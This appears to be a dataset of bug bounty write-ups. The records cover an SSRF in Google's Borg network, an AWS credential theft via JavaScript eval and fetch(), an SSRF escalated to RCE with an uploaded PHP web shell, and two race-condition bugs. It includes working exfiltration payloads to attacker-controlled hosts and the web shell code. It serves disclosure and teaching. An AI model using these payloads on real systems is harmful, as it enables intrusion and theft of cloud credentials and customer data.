I saw in my Google App Engine instance logs. Regarding the architecture, we can find jobs related to almost all of the components of the Google Stack , in particular MapReduce, BitTable, Flume, GFS… On the technology side, Java seems to be heavily used. I didn’t see any mention of Python, C++, NodeJS or Go, but that doesn’t mean it wasn’t used so don’t draw conclusions. 😛 I should mention that Borg, like Kubernetes, relies on containers like Docker, and VMs. For video processing, it seems they are using Gvisor , a Google open-source tool that looks like a trade-off between containers performance and VMs security. Parameters gives some information on how to reach the applications through network ports. On Borg, it seems that all applications on a server share the same IP address and each has some dedicated ports. Apps arguments were the most fun part for me because it is almost code. I didn’t find Google Search secret algorithm but there was some cool queries like this: MSCR(M(Customer.AdGroupCriterion+Customer.AdGroupCriterion-marshal+FilterDurianAdGroupCriterion+FilterNeedReviewAdGroupCriterion+GroupAdGroupCriterionByAdGroupKey+JoinAdGroupData/MakeUnionTable:3)+M(JoinAdGroupData/MakeUnionTable:2)+M(Customer.AdGroup+Customer.AdGroup-marshal+FilterDurianAdGroup+ParDo(AdGroupDataStripFieldsFn)+JoinAdGroupData/MakeUnionTable)+R(JoinAdGroupData/GroupUnionTables+JoinAdGroupData/ConstructJoinResults+JoinAdGroupData/ExtractTuples+ExtractCreativeAndKeywordReviewables)) If you wonder what’s Gmail system user, it’s gmail@prod.google.com There is also a user “legal-discovery@prod.google.com” that has permission “auth.impersonation.impersonateNormalUser” on “mdb:all-person-users”. (edit: for clarification, I just saw these strings close to each other in a big array and assumed that’s what it meant) There was also a little bit of history which showed that most jobs where aborted before finishing. At last, there was a lot of url to other servers or applications endpoints. In particular, I tried to access a promising-looking http://wiki/ url but it didn’t work. I tested a /getFile?FileName=/sys/borglet/borglet.INFO url but got an unauthorized response. I also tried to change the FileName parameter but got error messages. Google VRP response I reported the issue on Saturday May 12, 2018, and it was automatically triaged as a P3 (medium priority) issue. On Sunday I sent an email to Google Security that they might want someone to have a look at this. On Monday morning the issue was escalated to P0 (critical) then later decreased to P1. On Monday night the vulnerable endpoint was removed and the issue fixed. It’s not easy to determine the impact of an SSRF because it really depends on what’s in the internal network. Google tends to keep most of its infrastructure available internally and uses a lot of web endpoints, which means that in case of a SSRF, an attacker could potentially access hundreds if not thousands of internal web applications. On the other hand, Google heavily relies on authentication to access resources which limits the impact of a SSRF. In this case, the Borglet status monitoring page wasn’t authenticated, and it leaked a lot of information about the infrastructure. My understanding is that in Kubernetes, this page is authenticated. Google VRP rewarded me with $13,337, which corresponds to something like unrestricted file access! They explained that while most internal resources would require authentication, they have seen in the past dev or debug handlers giving access to more than just info leaks, so they decided to reward for the maximum potential impact. I’d like to thank them for the bounty and for their quick response. That’s it for this story, I hope you enjoyed it as much I did and feel free to comment! Tweet Google Borg , Google , Kubernetes , SSRF 7 comments on “ Into the Borg – SSRF inside Google production network ” Joe Ovez says: July 20, 2018 at 8:48 pm This is a great find. SSRF is a really unappreciated vulnerability; it is usually game-over. That it came from a Caja audit adds some tasty irony. A friendly word of advice: when you find flaws like this (you, the reader, not you, the guy who wrote this post), think carefully before disclosing internal network details you discover like this writer did. The internal details of a target network don’t become public domain simply because you found a vulnerability. There are firms that get extremely itchy about this kind of stuff getting published, and I can’t blame them. Engue Gillier says: July 20, 2018 at 9:59 pm Thanks! You’re right, disclosure should be done responsibly. I believe I didn’t disclose any sensitive information, my post is just informative, with a little bit of humor that might not be understood by everybody 😛 My intent is to show that there is no magic behind this, it’s just engineering, and it’s beautiful when it’s well done! MJ says: July 20, 2018 at 11:31 pm FYI – the above post is from a spammer that has copied tptacek’s top comment on the HN article: https://news.ycombinator.com/item?id=17576720 Engue Gillier says: July 21, 2018 at 12:40 am I see, interesting conversations out there! concerned says: July 21, 2018 at 10:25 pm the joe ovez link url links to a malicious site. please sanitize Jon DeGeorge says: November 22, 2018 at 3:57 am The “cafe” task on the Borglet page stands for Content Ads Front End, the component of the Google Ads network that displays ads on participating websites. The “apps-upload” task is many Google-wide upload dialogs (e.g. the Gmail photo upload and profile picture upload boxes) You mentioned that you saw nothing that said sites. “jotspot” is the original name for classic Google Sites, and “atari” is the codename for New Google Sites. Benjamin Amywarach says: May 3, 2020 at 4:16 pm Great find. New to looking for bugs, initially was focused on information leakage in Google subdomains, but your blog has taught me to go deeper into the app. Thanks! 👏👏☕ Comments are closed. Search for: Recent Posts DOM XSS in Gmail with a little help from Chrome Into the Borg – SSRF inside Google production network Stored XSS on Facebook FlashME! – WordPress vulnerability disclosure [CVE-2016-9263] [CVE-2016-9263] XSF vulnerability in WordPress [UPDATED] Recent Comments Engue Gillier on DOM XSS in Gmail with a little help from Chrome vahhitiu on DOM XSS in Gmail with a little help from Chrome Just a nOob on DOM XSS in Gmail with a little help from Chrome Nani on DOM XSS in Gmail with a little help from Chrome Engue Gillier on DOM XSS in Gmail with a little help from Chrome Footer Menu Top Home © 2025 OpnSec . Theme by XtremelySocial ."}
{"source_url": "http://10degres.net/aws-takeover-ssrf-javascript/", "title": "AWS takeover through SSRF in JavaScript Â· Gwendal Le Coguic", "friendly_explanation": "This is a bug bounty writeup from http://10degres.net/aws-takeover-ssrf-javascript/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAWS takeover through SSRF in JavaScript Â· Gwendal Le Coguic Gwendal Le Coguic Posts Courses Clients Projects CVEs Press AWS takeover through SSRF in JavaScript October 2, 2018 8 minutes read bug bounty â¢ aws â¢ ssrf â¢ javascript Here is the story of a bug I found in a private bug bounty program on Hackerone . It took me exactly 12h30 -no break- to find it, exploit and report. I was able to dump the AWS credentials, this lead me to fully compromise the account of the company: 20 buckets and 80 EC2 instances (Amazon Elastic Compute Cloud) in my hands. Besides the fact that it’s one of my best bug in my hunter career, I also learnt alot during this sprint, so let’s share! Intro As I said, the program is private so the company, let’s call it: ArticMonkey. For the purpose of their activity -and their web application- ArticMonkey has developed a custom macro language, let’s call it: Banan++. I don’t know what language was initially used for the creation of Banan++ but from the webapp you can get a JavaScript version, let’s dig in! The original banan++.js file was minified, but still huge, 2.1M compressed, 2.5M beautified, 56441 lines and 2546981 characters, enjoy. No need to say that I didn’t read the whole sh… By searching some keywords very specific to Banan++, I located the first function at line 3348. About 135 functions were available at that time. This was my playground. Spot the issue I started to read the code by the top but most of the functions were about date manipulation or mathematical operations, nothing really insteresting or dangerous. After a while, I finally found one called Union() that looked promising, below the code: helper . prototype . Union = function () { for ( var _len22 = arguments . length , args = Array( _len22 ), _key22 = 0 ; _key22 < _len22 ; _key22 ++ ) args [ _key22 ] = arguments [ _key22 ]; var value = args . shift (), symbol = args . shift (), results = args . filter ( function ( arg ) { try { return eval( value + symbol + arg ) } catch ( e ) { return ! 1 } }); return !! results . length } Did you notice that? Did you notice that kinky eval() ? Looks sooooooooooo interesting! I copied the code on a local HTML file in order to perform more tests. Basically the function can take from 0 to infinite arguments but start to be useful at 3. The eval() is used to compare the first argument to the third one with the help of the second, then the fourth is tested, the fifth etc… Normal usage should be something like Union(1,'<',3); and the returned value true if at least one of these tests is true or false . However there is absolutely no sanitization performed or test regarding the type and the value of the arguments. With the help of my favourite debugger alert() I understood that an exploit could be triggered in many different ways: Union ( 'alert()//' , '2' , '3' ); Union ( '1' , '2;alert();' , '3' ); Union ( '1' , '2' , '3;alert()' ); ... Find an injection point Ok so I had a vulnerable function, which is always good, but what I needed was an input to inject some malicious code. I remembered that I already seen some POST parameters using Banan++ functions so I performed a quick search in my Burp Suite history. Got it: POST /REDACTED HTTP / 1.1 Host : api.REDACTED.com Connection : close Content-Length : 232 Accept : application/json, text/plain, */* User-Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3502.0 Safari/537.36 autochrome/red Content-Type : application/json;charset=UTF-8 Referer : https://app.REDACTED.com/REDACTED Accept-Encoding : gzip, deflate Accept-Language : fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Cookie : auth=REDACTED { ...REDACTED..., \"operation\" : \"( Year( CurrentDate() ) > 2017 )\" } Response: HTTP / 1.1 200 OK Content-Type : application/json; charset=utf-8 Content-Length : 54 Connection : close X-Content-Type-Options : nosniff X-Xss-Protection : 1 Strict-Transport-Security : max-age=15768000; includeSubDomains ...REDACTED... [{ \"name\" : \"REDACTED\" , ...REDACTED... }] The parameter operation seems to be a good option. Time for testing! Perform the injection Since I didn’t know anything about Banan++, I had to perform some tests in order to find out what kind of code I could inject or not. Sort of manual fuzzing. { ...REDACTED..., \"operation\" : \"'\\\"><\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : null } [] { ...REDACTED..., \"operation\" : \"0\" } [] { ...REDACTED..., \"operation\" : \"1\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"a\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"a=1\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"alert\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"alert()\" } { \"status\" : 400 , \"message\" : \"Function 'alert' is not defined\" } { ...REDACTED..., \"operation\" : \"Union()\" } [] What I conclued here was: I cannot inject whatever JavaScript I want I can inject Banan++ functions the response seems to act like a true/false flag depending if the interpretation of parameter operation is true or false (which was very useful to validate the code I injected) Let’s continue with Union() : { ...REDACTED..., \"operation\" : \"Union(1,2,3)\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"Union(a,b,c)\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"Union('a','b','c')\" } { \"status\" : 400 , \"message\" : \"Parse error on line 1...REDACTED...\" } { ...REDACTED..., \"operation\" : \"Union('a';'b';'c')\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"Union('1';'2';'3')\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"Union('1';'<';'3')\" } [{ \"name\" : \"REDACTED\" , ...REDACTED... }] { ...REDACTED..., \"operation\" : \"Union('1';'>';'3')\" } [] ] Perfect! If 1 < 3 then the response contains valid datas (true), but if 1 > 3 then the response is empty (false). Parameters must be separated by a semi colon. I could now try a real attack. fetch is the new XMLHttpRequest Because the request is an ajax call to the api that only returns JSON datas, it’s obviously not a client side injection. I also knew from a previous report that ArticMonkey tends to use alot JavaScript server side. But it doesn’t matter, I had to try everything, maybe I could trigger an error that would reveal informations about the system the JavaScript runs on. Since my local testing, I knew exactly how to inject my malicious code. I tried basic XSS payloads and malformed JavaScript but all I got was the error previously mentionned. I then tried to fire an HTTP request. With an ajax call first: x = new XMLHttpRequest ; x . open ( 'GET' , 'https://poc.myserver.com' ); x . send (); But didn’t receive anything. I tried HTML injection: i = document. createElement ( 'img' ); i . src = '<img src=\"https://poc.myserver.com/xxx.png\">' ; document. body . appendChild ( i ); But didn’t receive anything! More tries: document. body . innerHTML += '<img src=\"https://poc.myserver.com/xxx.png\">' ; document. body . innerHTML += '<iframe src=\"https://poc.myserver.com\">' ; But didn’t receive anything!!! Sometimes you know, you have to test stupid things by yourself to understand how stupid it was… Obviously it was a mistake to try to render HTML code, but hey! I’m just a hacker… Back to the ajax request, I stayed stuck there for a while. It took me quite a long time to figure out how to make it work. I finally remembered that ArticMonkey uses ReactJS on their frontend, I would later learnt that they use NodeJS server side. Anyway, I checked on Google how to perform an ajax request with it and found the solution in the official documentation which lead me to the fetch() function which is the new standard to perform ajax calls, that was the key. I injected the following: fetch ( 'https://poc.myserver.com' ) And immediately got a new line in my Apache log. Being able to ping my server is a thing but it’s a blind SSRF, I had no response echoed back. I had the idea to chain two requests where the second would send the result of the first one. Something like: x1 = new XMLHttpRequest ; x1 . open ( 'GET' , 'https://...' , false ); x1 . send (); r = x1 . responseText ; x2 = new XMLHttpRequest ; x2 . open ( 'GET' , 'https://poc.myserver.com/?r=' + r , false ); x2 . send (); Again it took me while to get the correct syntax with fetch() . Thanks StackOverflow . I ended with the following code which works pretty well: fetch ( 'https://...' ). then ( res => res . text ()). then (( r )=> fetch ( 'https://poc.myserver.com/?r=' + r )); Of course, Origin policy applies. SSRF for the win I firstly tried to read local files: fetch ( 'file:///etc/issue' ). then ( res => res . text ()). then (( r )=> fetch ( 'https://poc.myserver.com/?r=' + r )); But the response ( r parameter) in my Apache log file was empty. Since I found some S3 buckets related to ArticMonkey ( articmonkey-xxx ), I thought that this company might also use AWS servers for their webapp (which was also confirmed by the header in some responses x-cache: Hit from cloudfront ). I quickly jumped on the list of the most common SSRF URL for Cloud Instances . And got a nice hit when I tried to access the metadatas of the instance. Decoded output is the directory listing returned: ami-id ami-launch-index ami-manifest-path block-device-mapping/ hostname iam/ ... Final payload: {...REDACTED...,\"operation\":\"Union('1';'2;fetch(\\\"http://169.254.169.254/latest/meta-data/\\\").then(res=>res.text()).then((r)=>fetch(\\\"https://poc.myserver.com/?r=\\\"+r));';'3')\"} Since I didn’t know anything about AWS metadatas, because it was my first time in da place. I took time to explore the directories and all files at my disposition. As you will read everywhere, the most insteresting one is http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE> . Which returned: { \"Code\" : \"Success\" , \"Type\" : \"AWS-HMAC\" , \"AccessKeyId\" : \"...REDACTED...\" , \"SecretAccessKey\" : \"...REDACTED...\" , \"Token\" : \"...REDACTED...\" , \"Expiration\" : \"2018-09-06T19:24:38Z\" , \"LastUpdated\" : \"2018-09-06T19:09:38Z\" } Exploit the credentials At that time, I though that the game was ended. But for my PoC I wanted to show the criticity of this leak, I wanted something really strong! I tried to use those credentials to impersonate the company. You have to know that they are temporary credentials, only valid for a short period, 5mn more or less. Anyway, 5mn is supposed to be more than enough to update my own credentials to those ones, 2 copy/paste, I can handle that… err… I asked for help on Twitter from SSRF and AWS master. Thank guys, I truely appreciate your commitment, but I finally found the solution in the UserGuide of AWS Identity and Access Management . My mistake, except to not read the documentation (…), was to only use AccessKeyId and SecretAccessKey , this doesn’t work, the token must also be exported. Kiddies… $ export AWS_ACCESS_KEY_ID = AKIAX7EFFWBWFRW3ACIR... $ export AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI... $ export AWS_SESSION_TOKEN = AQoDYXdzEJr... Checking my idendity with the following command proved that I was not myself anymore. aws sts get-caller-identity And then… Left: listing of the EC2 instances configured by ArticMonkey. Probably a big part -or the whole- of their system. Right: the company owns 20 buckets containing, highly sensitive datas from customers, static files for the web application and, according to the name of the buckets, probably logs/backups of their servers. Impact: lethal. Conclusion I learnt alot because of this bug: ReactJS, fetch(), AWS metadatas. RTFM! The official documentation is always a great source of (useful) informations. At each step new problems appeared. I had to search everywhere, try many different things, I had to push my limits to not give up. I now know that I can fully compromise a system by myself starting from 0, which is a great personal achievement and statisfaction :) When someone tells you that you’ll never be able to do something, don’t waste your time to bargain with these peoples, simply prove them they’re wrong by doing it. Timeline 06/09/2018 12h00 - beginning of the hunt 07/09/2018 00h30 - report 07/09/2018 19h30 - fix and reward Thanks to ArticMonkey for being so fast to fix and reward, and agreed this article :) External resources React Introduction to fetch() PayloadsAllTheThings AWS Documentation"}
{"source_url": "https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9", "title": "Escalating SSRF to RCE. Escalating SSRF to RCE in AWS Elastic… | by Youssef A. Mohamed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nEscalating SSRF to RCE. Escalating SSRF to RCE in AWS Elastic… | by Youssef A. Mohamed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Escalating SSRF to RCE Youssef A. Mohamed 5 min read · Mar 12, 2019 -- 2 Listen Share Case: AWS Elastic Beanstalk Press enter or click to view image in full size Hello Pentesters, I’m Youssef A. Mohamed aka GeneralEG Security Researcher @ CESPPA , Cyber Security Engineer @ Squnity and SRT Member @ Synack Press enter or click to view image in full size Today I’m going to share a new juicy vulnerability with you as usual. This issue found in a private client so let’s call it redacted.com Exploring the scope: While enumerating the client’s domain for subdomains. I’ve found subdomain [docs] I came out to this subdomain [docs.redact.com] Finding Out-of-band resource load: The [docs] subdomain was showing some documentations and kind of statistics While clicking on a statistic’s photo I saw kind of weird but not a magical Link: Press enter or click to view image in full size the first thing that came into my mind is to change the [url]’s value to generaleg0x01.com Then I noticed the [mimeType] parameter so edited the link and changed the values to be like this: https://docs.redact.com/report/api/v2/help/asset?url=https://generaleg0x01.com&mimeType=text/html&t=REDACTED.JWT.TOKEN&advertiserId=11 Press enter or click to view image in full size Until now it just [Out-of-band resource load] Verifying SSRF: While checking the requests/responses in my BurpSuite noticed Response Header [X-Amz-Cf-Id] So, I’ve figured out that they are on AWS Environment. We need to make sure that SSRF is working well here. So as we know [169.254.169.254] is the EC2 instance local IP address. Let’s try to access to the meta-data folder by navigating to [/latest/meta-data/]. Press enter or click to view image in full size SSRF Confirmed. Surfing on the EC2 Environment: Let’s check our current role by navigating to [/latest/meta-data/iam/security-credentials/]. It’s aws-elasticbeanstalk-ec2-role Press enter or click to view image in full size What’s AWS Elastic Beanstalk? AWS Elastic Beanstalk, is a Platform as a Service (PaaS) offering from AWS for deploying and scaling web applications developed for various environments such as Java, .NET, PHP, Node.js, Python, Ruby and Go. It automatically handles the deployment, capacity provisioning, load balancing, auto-scaling, and application health monitoring. Grabbing the needed data: 1) Go to [/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/] to get [AccessKeyId, SecretAccessKey, Token] Press enter or click to view image in full size 2) Go to [/latest/dynamic/instance-identity/document/] to get [instanceId, accountId, region] Press enter or click to view image in full size Configuring AWS Command Line Interface: Open your terminal: ~# apt install awscli ~# export AWS_ACCESS_KEY_ID=AccessKeyId ~# export AWS_SECRET_ACCESS_KEY=SecretAccessKey ~# export AWS_DEFAULT_REGION=region ~# export AWS_SESSION_TOKEN=Token Press enter or click to view image in full size to get the [UserID] ~# aws sts get-caller-identity Press enter or click to view image in full size SSRF exploited well, Now let’s explore further possibilities to escalate it to something Bigger “RCE”. Escalating SSRF to RCE: I went to try some potential exploitation scenarios. Escalating via [ssm send-command] fail After a few pieces of research tried to use AWS Systems Manager [ssm] command. The role is not authorized to perform this command. I was hoping to escalate it with aws ssm send-command. ~# aws ssm send-command — instance-ids “instanceId” — document-name “AWS-RunShellScript” — comment “whoami” — parameters commands=’curl 128.199.xx.xx:8080/`whoami`’ — output text — region=region An error occurred (AccessDeniedException) when calling the SendCommand operation: User: arn:aws:sts::765xxxxxxxxx:assumed-role/aws-elasticbeanstalk-ec2-role/i-007xxxxxxxxxxxxxx is not authorized to perform: ssm:SendCommand on resource: arn:aws:ec2:us-east-1:765xxxxxxxxx:instance/i-00xxxxxxxxxxxxxx Press enter or click to view image in full size Escalating via [SSH] fail SSH port is closed. I was hoping to escalate it with the famous scenario: “creating a RSA authentication key pair (public key and private key), to be able to log into a remote site from the account, without having to type the password.” Press enter or click to view image in full size Escalating via [Uploading Backdoor] Success Trying to read the [S3 Bucket] content: tried running multiple commands using AWS CLI to retrieve information from the AWS instance. However, access to most of the commands were denied due to the security policy in place. ~# aws s3 ls An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied Press enter or click to view image in full size After a few pieces of research figured that the managed policy “AWSElasticBeanstalkWebTier” only allows accessing S3 buckets whose name start with “elasticbeanstalk”. In order to access the S3 bucket, we will use the data we grabbed earlier with the following format: elasticbeanstalk-region-account-id Now, the bucket name is “elasticbeanstalk-us-east-1–76xxxxxxxx00”. Let’s listed bucket resources for “elasticbeanstalk-us-east-1–76xxxxxxxx00” in a recursive manner to perform this long-running task using AWS CLI: ~# aws s3 ls s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/ — recursive Press enter or click to view image in full size Now, Let’s try to upload a Backdoor! ~# cat cmd.php <?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?> Press enter or click to view image in full size ~# aws s3 cp cmd.php s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/ Press enter or click to view image in full size upload: ./cmd.php to s3://docs.redact.com/cmd.php Press enter or click to view image in full size And here we got a successful RCE! Press enter or click to view image in full size In a nutshell: You can escalate Server-Side Request Forgery to Remote Code Execute in many ways but it’s depending on your target’s Environment. Happy Hacking! AWS Rce Bugbounty Cesppa Generaleg -- -- 2 Written by Youssef A. Mohamed 395 followers · 47 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@04sabsas/bugbounty-writeup-creative-thinking-is-our-everything-race-condition-business-logic-error-2f3e82b9aa17", "title": "BugBounty WriteUp — Creative thinking is our everything (Race Condition + Business Logic Error) | by Oleksandr Opanasiuk | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@04sabsas/bugbounty-writeup-creative-thinking-is-our-everything-race-condition-business-logic-error-2f3e82b9aa17. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBugBounty WriteUp — Creative thinking is our everything (Race Condition + Business Logic Error) | by Oleksandr Opanasiuk | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in BugBounty WriteUp — Creative thinking is our everything (Race Condition + Business Logic Error) Oleksandr Opanasiuk 5 min read · Aug 5, 2019 -- 1 Listen Share So hello everyone! My name is Leks and this is the happy story of combining two vulnerabilities. Press enter or click to view image in full size [PART 1 — Logical] While testing an application with the ability to make a payment and increase the balance, I came across incorrect processing of zeros after the decimal point in the sum. Everywhere, the program rounds the numbers to a larger amount and the same thing in final price for billing. Buut … not everything was so simple with 0.009 . It turned out that the service simply credited 0.01 price without checking a bank card (respectively, and without withdrawing money). Then I was already relaxed, and I think this is a buzz, it will be P1 — unlimited adding money to the account. But after the second time, I got a little upset — it turned out that the larger the amount we put into the account, the more the minimum deposit to our account grows, so after the second time, when we had 0.02 on the account, our trick with 0.009 did not work, and we can’t replenish more(the rule was: you can make a payment only for sum, more or equal than you have on your account, thats why after 2nd time, I do have 0.02 , and cant purchase 0.01 as its little). After the opening of such an unpleasant surprise, I wrote down in ToDo list the fact of such vuln. At that time, I already exploited the Condition Race before, so I just wrote it down as an idea to use. [PART 2 — Technical] 1 month later… :) I decided to return to this vulnerability and exploit it further. Since there was an idea with Race Conditions. I need to explain how does Race Condition works here. When we start several threads at the same time, some of them catch old data on the server, what we use to our advantage. Press enter or click to view image in full size We have balance (a=0) and minimum deposit replenishment (b=0), which, as we know, increasing after every purchase. When we are increasing the balance (a+1), servers is looking at minimum deposit(b) and checks that the number to which we replenish is bigger than the balance (1≥b). In example of 8 requests: 1-4 requests caught on the server limit b=0, so only 4th request caught b=1. 5–8 made the same things. Because the server works with threads separately — the variables with which they begin to work do not change during this work. So in 5–8 requests — b=1, and only on 9th request data is updated, and the request no longer passes by the rules of the limit. This is important to understand — threads do not communicate with each other, like — Hey dude, I have +1 here, you need to change limit — Oh ok, np bro. Thats why we can create a race condition, during what threads use a non-updated date. Ok? Let’s go to exploiting. I started writing scripts. As I love python ❤, and I think that I can write everything on it, my scripts were on it. But after some time have found such a tool — I did not try it myself, but maybe it will make your life easier. aaronhnatiw/race-the-web Tests for race conditions in web applications by sending out a user-specified number of requests to a target URL (or… github.com So let’s look a little bit of scripts we need to exploit Race Condition. Race Conditions is exploiting easy — we just need to create scripts with requests and send them simultaneously to the site — and the more the better (for a white hacker, 20 requests will come down, only to show that the vulnerability exists, but if you want to exploit the vulnerability with maximum benefit — then you need a lot of requests). The request to purchase was looked like: Press enter or click to view image in full size I’m using python “requests”: Press enter or click to view image in full size Such script making POST-request with headers and tokens And cheers! Finally, he hacked and everything is behind! — you thought. Well, not so easy :) In my case, I had two pages, on one I make a payment, on the second I confirm, so I had to get unique tokens that were stored in the HTML code. Everything sounds easy — one script in this way created requests and collected tokens in a separate file, and the second took these tokens, substituted them into forms and confirmed. But in reality it was a little hard to do, in terms of sequence logic. As a result, the logic of my PoC was this: the 1st file creates payments and collects tokens. At this time, another accepts these tokens, creates a bunch of scripts (yeap, the script creates scripts, the future is near :) and inserts tokens into their code so that each file carries a unique token. After that, he creates a script like this — operand “&” runs them at the same time (more precisely, runs the next line of the script, without waiting for the end of the current line) And boooom! Everything worked and we got the cool Race Condition :) It is sometimes difficult to exploit such a vulnerability due to tokens, but it is nevertheless possible — just write down what is going on and make a plan. Many thanks to the HackerOne support team, as they quickly provided me with an account to test it after a letter with a request, and the owners of the program quickly confirmed the vulnerability and kept up to date with all the updates. So just keep thinking how to hack — and you will make it :) We reached the end, so I want to say — it is my first writeup, and you can follow me on Twitter to find out more — I will try to do it more often: Oleksandr Opanasiuk The latest Tweets from Oleksandr Opanasiuk (@Lekssik2). Great manager and not bad pentester. Ukraine twitter.com Have a nice day! :) Programming Hacking Writeup Bug Bounty Penetration Testing -- -- 1 Written by Oleksandr Opanasiuk 100 followers · 51 following Great pentester and not bad manager https://twitter.com/Lekssik2 Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ciph3r7r0ll/chaining-improper-authorization-to-race-condition-to-harvest-credit-card-details-a-bug-bounty-effe6e0f5076", "title": "Chaining Improper Authorization To Race Condition To Harvest Credit Card Details : A Bug Bounty Story | by Mandeep Jadon | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ciph3r7r0ll/chaining-improper-authorization-to-race-condition-to-harvest-credit-card-details-a-bug-bounty-effe6e0f5076. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nChaining Improper Authorization To Race Condition To Harvest Credit Card Details : A Bug Bounty Story | by Mandeep Jadon | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Chaining Improper Authorization To Race Condition To Harvest Credit Card Details : A Bug Bounty Story Mandeep Jadon 5 min read · Jun 13, 2019 -- 4 Listen Share Hey Guys . Hope you are doing well . In this post I would be covering how I ended up finding an unusual race condition at an unexpected place due to a logical flaw . I’ll not be too much technical here Since this issue is more of a logical issue than the usual technical vulnerabilities . So Lets call our target app as redacted.com . It was basically a shopping website that allows the user to enter personal and CC details after selecting the product of choice . So the vulnerable URL was something like : https://www.redacted.com/checkout/36014f0cc44343434/details/ ) This presented a screen as shows . PS : I’ve taken the screenshots from the video so please don’t mind the clarity . I’ll try to explain everything . The above 2 screenshots depict the checkout page . PROBLEM I found if some error occurs on the checkout page due to some input error after the person enters his details and hit the checkout button, the same page is returned asking user to fill in correctly (Server side validation: NICE :) ) . I copied the URL (checkout) that had the partially filled form and pasted in another browser (Different account) and Boom ! I got the same partially filled information . This is a vulnerability . But We got problems :/ Now the problem was that how do I make a exploitation scenario out of it ? The Checkout URL ( https://www.redacted.com/checkout/36014f0cc44343434/details/ ) was a having a random string . I spent few time trying to reverse it , but ended up in failure . One Scenario came into my mind , What If the attacker sends the checkout URL to the victim and asks him to do the checkout . Then there may be a possibility that the attacker is able to see all the information that the victim is trying to type . But we have a problem !! The checkout page will only spit out the pre-filled information if the person has made some mistake in filling any filed . How do I do that :/ So The exploitation scenario was like : The Attacker sends the Checkout URL ( https://www.redacted.com/checkout/36014f0cc44343434/details/ ) to the victim asking him to do the checkout . (Luring him of any offer ) The victim starts to enter the checkout details . The attacker opens up the checkout URL in his window and keeps on refreshing the page constantly . The victim does some mistake (syntactical ) in entering the detail and clicks on the checkout button . The error pops up and the prefilled form is shown back to the victim . The attacker also now sees the prefilled form and gets away with profit . (CC details were not masked ) . But ………….. Ehhhh . This was not satisfying . Why will the victim commit mistake in filling the form . The scenario is too much dependent on the victim . If the victim does not commit mistake the attacker will not be able to see the pre-filled form . Damn !! So I had to find a way that was not depended on the error . I spend the next couple of hours in finding a way . I tried CSRF to force the victim to generate error . But that was stupid as I was the only one who was giving the pre-filled information . After some hit and trail my mind poped up with a strange Idea !!! Enter the Race Condition : What would be the server’s reaction if instead of doing a manual browser refresh at the attacker’s end multiple times I do it in burp intruder with a good amount of threads . So I took the Checkout URL and Fired up Burp Intruder and began intruding with NULL payloads . (100 Threads) . Meanwhile I filed up the form at the victim’s end and hit Submit button . I was eagerly waiting for something to happen at the intruder’s end and ….. Press enter or click to view image in full size We got a different response length just after submitting the URL at the intruder’s end . The response after goes to 3xx which depicts that the checkout has been done and its moving to the final page . Now lets see what have I got here in the response . Press enter or click to view image in full size Yesssssss !!! The CC number got leaked in the response !!!!!!!! Just to add this response has all the details that the victim has entered . :) I just made a Dirty diagram that would help in understanding the issue better ( yeah its dirty , I’ve been writing for so long :( ) : Press enter or click to view image in full size As you can see that the The attacker began requesting the response of the checkout URL in an extremely fast multi threaded manner . As soon as the victim submits full details to the server the server caches the details and inadvertently gives the response to the attacker (that the attacker has been requesting in a multi threaded manner)that has all the information of the form . So before going to the next page (3xx) , the response is sent to the checkout URL requester (Attacker) without the need of any error . That was pretty much all of it . See you guys . Take care . A big Shoutout to the Indian Bug Hunter Community !!! Security -- -- 4 Written by Mandeep Jadon 331 followers · 3 following Cybersecurity Enthusiastic | Bathroom Singer l Writer | Bug Hunter | Into Memes :) Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
